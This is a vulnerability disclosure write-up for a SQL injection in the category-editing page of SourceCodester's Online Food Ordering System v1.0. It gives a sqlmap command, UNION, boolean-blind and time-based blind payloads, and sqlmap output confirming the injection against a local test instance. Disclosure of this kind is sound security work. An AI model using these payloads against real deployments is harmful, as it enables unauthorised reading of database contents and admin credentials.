# SQL Injection in Online Food Ordering System (Manage Category)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Category Management (`admin/manage_category.php`)
* **Vulnerable Parameter**: `id` (GET)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `admin/manage_category.php` file, which is used for editing existing food categories.

The application fails to properly sanitize the `id` parameter in the HTTP GET request. This allows an authenticated attacker (or administrator) to inject arbitrary SQL commands. Since the backend is **SQLite** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application as an administrator.
3. **Tools**: Use `sqlmap` to automate the exploitation.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/admin/manage_category.php?id=4" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Referer: http://127.0.0.1:8088/admin/?page=maintenance" \
--cookie="PHPSESSID=YOUR_COOKIE_HERE" \
--batch -v 6 --risk=3

```

## PoC Payload

**UNION Query Payload (High Impact):**

```sql
id=-6484' UNION ALL SELECT CHAR(113,98,122,122,113)||CHAR(90,70,65,109,104,118,88,116,99,87,114,75,108,83,121,112,89,73,120,72,100,84,84,72,108,84,111,79,78,88,103,122,110,116,97,71,107,67,84,78)||CHAR(113,112,112,112,113),NULL,NULL,NULL-- BWFm

```

**Boolean-based Blind Payload:**

```sql
id=4' AND 3071=3071 AND 'KTAi'='KTAi

```

## Proof of Concept

The following output from `sqlmap` confirms that the `id` parameter in `manage_category.php` is vulnerable to UNION query injection (4 columns), as well as Boolean-based and Time-based blind injection.

```text
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4' AND 3071=3071 AND 'KTAi'='KTAi
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: id=4' AND 8133=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'tHIF'='tHIF
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-6484' UNION ALL SELECT ... ,NULL,NULL,NULL-- BWFm
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
---
[INFO] the back-end DBMS is SQLite

```
<img width="1055" height="420" alt="图片" src="https://github.com/user-attachments/assets/20d26da8-6e92-4368-80f8-ffd03d8b2d61" />
<img width="1096" height="751" alt="图片" src="https://github.com/user-attachments/assets/87278929-6777-4053-8447-c5bf0c1d84b6" />


## Impact

This vulnerability allows an attacker to:

1. **Data Exfiltration**: Directly retrieve and display database content via UNION-based attacks.
2. **Authentication Bypass**: Read admin credentials.
3. **System Compromise**: Enumerate database schema and server information.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
